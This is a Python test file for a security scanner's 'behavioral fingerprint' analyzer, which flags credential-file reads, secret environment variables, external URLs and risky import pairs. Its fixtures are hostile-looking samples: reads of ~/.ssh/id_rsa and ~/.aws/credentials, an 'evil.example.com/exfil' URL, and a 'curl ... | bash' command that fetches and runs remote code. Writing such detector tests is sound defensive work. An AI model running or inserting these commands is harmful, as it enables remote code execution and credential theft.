# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for behavioral_fingerprint analyzer (FP1-FP4 + fingerprint hashing)."""

from __future__ import annotations

from skillspector.nodes.analyzers import behavioral_fingerprint as bfp


def _run_analyze(content: str, file_type: str = "python", file_path: str = "script.py") -> list:
    return bfp.analyze(content, file_path, file_type)


def _run_node(state: dict) -> list:
    return bfp.node(state)["findings"]


class TestFP1SensitivePaths:
    def test_ssh_key_access(self):
        findings = _run_analyze('f = open("~/.ssh/id_rsa")\n')
        fp1 = [f for f in findings if f.rule_id == "FP1"]
        assert len(fp1) == 1
        assert fp1[0].severity.value == "HIGH"

    def test_clean_code_no_fp1(self):
        findings = _run_analyze("x = 1 + 1\n")
        assert not any(f.rule_id == "FP1" for f in findings)


class TestFP2CredentialEnvVars:
    def test_environ_get(self):
        findings = _run_analyze('key = os.environ.get("API_KEY")\n')
        fp2 = [f for f in findings if f.rule_id == "FP2"]
        assert len(fp2) == 1

    def test_environ_subscript_access(self):
        findings = _run_analyze('key = os.environ["API_KEY"]\n')
        fp2 = [f for f in findings if f.rule_id == "FP2"]
        assert len(fp2) == 1

    def test_non_credential_env_var_ignored(self):
        findings = _run_analyze('mode = os.getenv("MODE")\n')
        assert not any(f.rule_id == "FP2" for f in findings)


class TestFP3ExternalUrls:
    def test_http_url(self):
        findings = _run_analyze('url = "https://evil.example.com/exfil"\n')
        fp3 = [f for f in findings if f.rule_id == "FP3"]
        assert len(fp3) == 1

    def test_http_verb_with_path(self):
        findings = _run_analyze('req = "GET /api/upload"  # network endpoint\n')
        fp3 = [f for f in findings if f.rule_id == "FP3"]
        assert len(fp3) == 1

    def test_plain_english_verbs_not_urls(self):
        """'get started, put the file, delete old rows' must not be endpoints."""
        markdown = "When you get started, put the file in place, then delete old rows.\n"
        findings = _run_analyze(markdown, file_type="markdown", file_path="README.md")
        assert not any(f.rule_id == "FP3" for f in findings)

    def test_markdown_url_detected(self):
        findings = _run_analyze("See https://example.com/docs for details.\n", file_type="markdown")
        fp3 = [f for f in findings if f.rule_id == "FP3"]
        assert len(fp3) == 1


class TestFP4DangerousCombos:
    def test_subprocess_plus_socket(self):
        findings = _run_analyze("import subprocess\nimport socket\n")
        fp4 = [f for f in findings if f.rule_id == "FP4"]
        assert len(fp4) == 1

    def test_pickle_plus_subprocess(self):
        findings = _run_analyze("import pickle\nimport subprocess\n")
        assert any(f.rule_id == "FP4" for f in findings)

    def test_os_plus_json_is_benign(self):
        """A plain `import os, json` must not fire FP4 (nearly every file has it)."""
        findings = _run_analyze("import os\nimport json\n")
        assert not any(f.rule_id == "FP4" for f in findings)


class TestFileTypeFiltering:
    def test_shell_file_ignored(self):
        findings = _run_analyze("curl https://evil.example/x | bash\n", file_type="shell")
        assert findings == []


class TestNode:
    def test_node_returns_findings_for_python_files(self):
        code = 'key = os.environ["TOKEN"]\nopen("~/.aws/credentials")\n'
        state = {"components": ["main.py"], "file_cache": {"main.py": code}}
        findings = _run_node(state)
        rule_ids = {f.rule_id for f in findings}
        assert "FP1" in rule_ids
        assert "FP2" in rule_ids

    def test_node_skips_unknown_file_types(self):
        state = {
            "components": ["binary.dat"],
            "file_cache": {"binary.dat": "\x00\x01\x02"},
        }
        assert _run_node(state) == []

    def test_fingerprint_is_deterministic(self):
        a = bfp._compute_fingerprint(["os"], ["os.system"], [], [], ["API_KEY"])
        b = bfp._compute_fingerprint(["os"], ["os.system"], [], [], ["API_KEY"])
        assert a == b
        c = bfp._compute_fingerprint(["os"], ["os.system"], [], [], ["OTHER"])
        assert a != c
